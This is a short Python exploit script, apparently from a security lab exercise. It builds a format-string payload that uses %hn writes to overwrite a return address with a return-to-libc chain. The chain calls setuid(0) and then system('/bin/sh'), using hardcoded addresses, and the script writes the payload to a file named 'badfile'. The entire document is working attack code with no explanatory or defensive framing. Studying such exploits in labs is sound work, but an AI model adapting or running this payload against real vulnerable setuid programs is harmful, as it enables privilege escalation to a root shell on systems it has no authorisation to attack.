#!/usr/bin/python3
import sys

N        = 200  # length of payload 
padding  = 15   # words before return address
addr     = 0xffffd078 + 4  # address of return address
payload  = (addr + 14).to_bytes(4, byteorder='little')  # high 2 bytes of /bin/sh string address
payload += ("@@@@").encode('latin-1')
payload += (addr + 12).to_bytes(4, byteorder='little')  # low  2 bytes of /bin/sh string address
payload += ("@@@@").encode('latin-1')
payload += (addr + 10).to_bytes(4, byteorder='little')  # high 2 bytes of setuid arg -> 0x0000
payload += ("@@@@").encode('latin-1')           
payload += (addr +  8).to_bytes(4, byteorder='little')  # low  2 bytes of setuid arg -> 0x0000
payload += ("@@@@").encode('latin-1')
payload += (addr +  6).to_bytes(4, byteorder='little')  # high 2 bytes of system address
payload += ("@@@@").encode('latin-1')
payload += (addr +  4).to_bytes(4, byteorder='little')  # low  2 bytes of system address
payload += ("@@@@").encode('latin-1')
payload += (addr +  2).to_bytes(4, byteorder='little')  # high 2 bytes of setuid address
payload += ("@@@@").encode('latin-1')
payload += (addr).to_bytes(4,byteorder='little')        # low  2 bytes of setuid address

sh_str_addr = 0xf7f49b62
system_addr = 0xf7dfed00
setuid_addr = 0xf7e84b00

# Construct the format string
offset1 = 0xf7f4  - len(payload)
offset2 = 0x19b62 - 0xf7f4
offset3 = 0x20000 - 0x19b62
offset4 = 0x30000 - 0x20000
offset5 = 0x3f7df - 0x30000
offset6 = 0x4ed00 - 0x3f7df
offset7 = 0x4f7e8 - 0x4ed00
offset8 = 0x54b00 - 0x4f7e8
s = "%." + str(offset1) + "x" + "%" + str(padding +  2) + "$hn" + \
    "%." + str(offset2) + "x" + "%" + str(padding +  4) + "$hn" + \
    "%." + str(offset3) + "x" + "%" + str(padding +  6) + "$hn" + \
    "%." + str(offset4) + "x" + "%" + str(padding +  8) + "$hn" + \
    "%." + str(offset5) + "x" + "%" + str(padding + 10) + "$hn" + \
    "%." + str(offset6) + "x" + "%" + str(padding + 12) + "$hn" + \
    "%." + str(offset7) + "x" + "%" + str(padding + 14) + "$hn" + \
    "%." + str(offset8) + "x" + "%" + str(padding + 16) + "$hn" + "\n"
payload += s.encode('latin-1')

assert len(payload) <= N, "Payload is too long: %d!" % len(payload)
payload += bytearray(0x90 for _ in range(N - len(payload)))

# Write the payload to badfile
with open("badfile", "wb") as f:
  f.write(payload)
